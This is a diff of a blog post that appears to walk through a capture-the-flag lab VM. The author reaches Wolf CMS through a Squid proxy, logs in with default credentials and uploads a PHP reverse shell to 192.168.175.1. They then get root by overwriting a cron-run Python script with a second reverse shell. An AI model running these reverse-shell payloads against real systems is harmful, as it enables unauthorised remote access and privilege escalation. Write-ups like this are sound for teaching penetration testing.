@@ -6,31 +6,44 @@ published: false
 
 To get VM's IP I used nmap
 	
-    # nmap -sn 192.168.175.*
+[1]
 
-	Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-08 22:47 CET
-	Nmap scan report for 192.168.175.131
-	Host is up (0.00017s latency).
-	MAC Address: 00:50:56:26:E0:9E (VMware)
-	Nmap scan report for 192.168.175.254
-	Host is up (-0.10s latency).
-	MAC Address: 00:50:56:F2:26:25 (VMware)
-	Nmap scan report for 192.168.175.1
-	Host is up.
-	Nmap done: 256 IP addresses (3 hosts up) scanned in 4.59 seconds
-	
-#   
-    
-    # nmap 192.168.175.131
-	
-	Starting Nmap 7.01 ( https://nmap.org ) at 2017-03-08 22:47 CET
-	Nmap scan report for 192.168.175.131
-	Host is up (0.00019s latency).
-	Not shown: 997 filtered ports
-	PORT     STATE  SERVICE
-	22/tcp   open   ssh
-	3128	/tcp open   squid-http
-	8080/tcp closed http-proxy
-	MAC Address: 00:50:56:26:E0:9E (VMware)
-	
-	Nmap done: 1 IP address (1 host up) scanned in 11.06 seconds
+Output gave me information that VM runs http proxy. I configured Firefox to use it and tried to access VM's localhost. 
+
+[2]
+
+I succeed and noticed some simple website. I tried robots.txt and found that there is Wolf CMS run under /wolfcms
+
+[3]
+
+I asked google for some information about Wolf CMS and found two directories used for installation process - /install and /docs. I tried both but only /docs was available. In file http://localhost/wolfcms/docs/install.txt I found default credentials, but I didn't know where to put them. I went to google again and searched for URL to admin panel which occurred to be http://localhost/wolfcms/?/admin/login.
+Default credentials worked and I got access to administration panel.
+
+[4]
+
+From this place I was able to upload reverse shell and connect to VM.
+
+	<?php
+	exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.175.1/8888 0>&1'");
+	?>
+
+After I got access to shell and started investigation what this machines does. I found that there is a cron running python script as root every minute. Fortunatelly I had permission to overwrite this file.
+
+[5]
+
+I uploaded reverse shell again, but this time written in python.
+
+	#!/usr/bin/python
+	import os
+	os.system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.175.1/9999 0>&1'")
+
+I used existing shell to overwrite existing script with uploaded one, ran netcat on port 9999 and waited one minute until I got root shell.
+
+[6]
+
+[7]
+
+
+
+
+
